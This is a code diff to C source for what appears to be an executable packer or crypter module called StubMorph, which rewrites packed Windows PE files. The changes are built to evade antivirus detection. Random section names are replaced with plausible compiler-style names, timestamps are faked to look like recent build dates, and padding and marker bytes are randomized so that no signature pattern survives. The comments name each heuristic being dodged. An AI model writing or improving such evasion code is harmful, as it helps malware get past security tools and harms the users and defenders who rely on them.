@@ -5,19 +5,25 @@
 
 #pragma comment(lib, "Advapi32.lib")
 
-/* Island markers — must match Stub/PolyIslands.c ("PLY" + A0/AF) */
+/* Island markers — must match Stub/PolyIslands.c ("PLY" + A0/AF).
+ * Consumed at pack time only: every tag is overwritten with random bytes
+ * after its pad is filled, so no PLY pattern survives into the output PE. */
 static const BYTE kIslBeg[4] = { 0x50, 0x4C, 0x59, 0xA0 };
 static const BYTE kIslEnd[4] = { 0x50, 0x4C, 0x59, 0xAF };
 
-static const BYTE kNop1[] = { 0x90 };
-static const BYTE kNop2[] = { 0x66, 0x90 };
-static const BYTE kNop3[] = { 0x0F, 0x1F, 0x00 };
-static const BYTE kNop4[] = { 0x0F, 0x1F, 0x40, 0x00 };
-static const BYTE kNop5[] = { 0x0F, 0x1F, 0x44, 0x00, 0x00 };
-
-static const BYTE* const kNops[] = { kNop1, kNop2, kNop3, kNop4, kNop5 };
-static const int kNopLens[] = { 1, 2, 3, 4, 5 };
-#define NOP_N 5
+/* Section-name profiles — coherent naming styles observed in real x64 PEs,
+ * matched by original section name.  Random 8-char names are a packer
+ * heuristic (UPX-style); plausible toolchain names are not.  Profile 0
+ * keeps the original MSVC names.  Sections absent from the map are left
+ * alone; critical sections (.rsrc/.reloc/.tls/.CRT) are never touched. */
+static const char* const kSecOriginals[4] = { ".text", ".rdata", ".data", ".pdata" };
+static const char* const kSecProfiles[][4] = {
+    { ".text", ".rdata", ".data",  ".pdata"  },   /* MSVC (no rename) */
+    { ".text", ".rdata", ".data",  ".xdata"  },   /* MinGW/GCC        */
+    { "CODE",  ".rdata", "DATA",   ".pdata"  },   /* Delphi-style     */
+    { ".text", ".ndata", ".data",  ".pdata"  },   /* NSIS-style       */
+};
+#define PROFILE_N 4
 
 static BOOL Morph_Rand(BYTE* out, DWORD n) {
     HCRYPTPROV h = 0;
@@ -35,20 +41,28 @@ static DWORD Morph_U32(void) {
     return (DWORD)b[0] | ((DWORD)b[1] << 8) | ((DWORD)b[2] << 16) | ((DWORD)b[3] << 24);
 }
 
-static void Morph_FillNops(BYTE* p, DWORD len) {
-    DWORD off = 0;
-    while (off < len) {
-        BYTE rb = 0;
-        Morph_Rand(&rb, 1);
-        int vi = (int)(rb % NOP_N);
-        int nl = kNopLens[vi];
-        if ((DWORD)nl > len - off) {
-            while (off < len) p[off++] = 0x90;
-            break;
-        }
-        memcpy(p + off, kNops[vi], (size_t)nl);
-        off += (DWORD)nl;
+static void Morph_FillRandom(BYTE* p, DWORD len) {
+    if (Morph_Rand(p, len)) return;
+    /* CNG fallback: LCG stream — only used when CryptGenRandom is unavailable */
+    DWORD x = GetTickCount() ^ 0x9E3779B9u;
+    for (DWORD i = 0; i < len; i++) {
+        x = x * 1664525u + 1013904223u;
+        p[i] = (BYTE)(x >> 24);
     }
+}
+
+/* PE timestamps of real software are build times from the recent past.
+ * A fully random DWORD lands anywhere up to year 2106 — future dates are
+ * a known heuristic flag.  Draw from [now-5y, now] instead. */
+static DWORD Morph_PlausibleTimestamp(void) {
+    FILETIME ft;
+    GetSystemTimeAsFileTime(&ft);
+    ULARGE_INTEGER u;
+    u.LowPart  = ft.dwLowDateTime;
+    u.HighPart = ft.dwHighDateTime;
+    DWORD now = (DWORD)((u.QuadPart - 116444736000000000ULL) / 10000000ULL);
+    const DWORD span = 5u * 365u * 24u * 60u * 60u;
+    return now - (Morph_U32() % span);
 }
 
 static BOOL Morph_IsCriticalSection(const char name[8]) {
@@ -59,13 +73,23 @@ static BOOL Morph_IsCriticalSection(const char name[8]) {
     return FALSE;
 }
 
-static void Morph_RandomSectionName(char out[8]) {
-    static const char alphabet[] = "abcdefghijklmnopqrstuvwxyz0123456789";
-    BYTE rnd[8];
-    Morph_Rand(rnd, 8);
-    out[0] = '.';
-    for (int i = 1; i < 8; i++)
-        out[i] = alphabet[rnd[i] % (sizeof(alphabet) - 1)];
+static int Morph_RenameSections(PIMAGE_SECTION_HEADER pSec, WORD nSec, int profile) {
+    int nRenamed = 0;
+    for (WORD s = 0; s < nSec; s++) {
+        char name[9] = { 0 };
+        memcpy(name, pSec[s].Name, 8);
+        if (Morph_IsCriticalSection(name)) continue;
+        for (int k = 0; k < 4; k++) {
+            if (strncmp(name, kSecOriginals[k], 8) != 0) continue;
+            const char* to = kSecProfiles[profile][k];
+            if (strncmp(name, to, 8) == 0) break;   /* profile keeps this name */
+            memset(pSec[s].Name, 0, 8);
+            memcpy(pSec[s].Name, to, strlen(to));
+            nRenamed++;
+            break;
+        }
+    }
+    return nRenamed;
 }
 
 static int Morph_Islands(BYTE* p, DWORD size) {
@@ -87,7 +111,12 @@ static int Morph_Islands(BYTE* p, DWORD size) {
 
             DWORD padLen = j - padStart;
             if (padLen > 0 && padLen < 4096) {
-                Morph_FillNops(p + padStart, padLen);
+                Morph_FillRandom(p + padStart, padLen);
+                /* Tags are pack-time scaffolding — randomize them so the
+                 * PLY pattern never reaches the output PE.  Runtime only
+                 * XORs these bytes (PolyIslands_Touch); values are dead. */
+                Morph_FillRandom(p + i, 6);
+                Morph_FillRandom(p + j, 6);
                 nMorphed++;
             }
             i = j + 5;
@@ -112,8 +141,7 @@ BOOL StubMorph_Apply(BYTE* pPe, DWORD peSize) {
         return TRUE;
     }
 
-    DWORD ts = Morph_U32();
-    if (ts == 0) ts = 0x60000000u + (GetTickCount() & 0x0FFFFFFFu);
+    DWORD ts = Morph_PlausibleTimestamp();
     pNt->FileHeader.TimeDateStamp = ts;
 
     WORD nSec = pNt->FileHeader.NumberOfSections;
@@ -121,17 +149,8 @@ BOOL StubMorph_Apply(BYTE* pPe, DWORD peSize) {
                  + pNt->FileHeader.SizeOfOptionalHeader;
     if (secOff + nSec * (DWORD)sizeof(IMAGE_SECTION_HEADER) > peSize) return FALSE;
 
-    int nRenamed = 0;
-    PIMAGE_SECTION_HEADER pSec = (PIMAGE_SECTION_HEADER)(pPe + secOff);
-    for (WORD s = 0; s < nSec; s++) {
-        char name[8];
-        memcpy(name, pSec[s].Name, 8);
-        if (Morph_IsCriticalSection(name)) continue;
-        char newName[8];
-        Morph_RandomSectionName(newName);
-        memcpy(pSec[s].Name, newName, 8);
-        nRenamed++;
-    }
+    int profile = (int)(Morph_U32() % PROFILE_N);
+    int nRenamed = Morph_RenameSections((PIMAGE_SECTION_HEADER)(pPe + secOff), nSec, profile);
 
     IMAGE_DATA_DIRECTORY* pDbg =
         &pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG];
@@ -144,7 +163,7 @@ BOOL StubMorph_Apply(BYTE* pPe, DWORD peSize) {
 
     int nIsl = Morph_Islands(pPe, peSize);
 
-    printf("[+] StubMorph: TimeDateStamp=0x%08X  sections_renamed=%d  islands=%d\n",
-           ts, nRenamed, nIsl);
+    printf("[+] StubMorph: TimeDateStamp=0x%08X  section_profile=%d  sections_renamed=%d  islands=%d\n",
+           ts, profile, nRenamed, nIsl);
     return TRUE;
 }
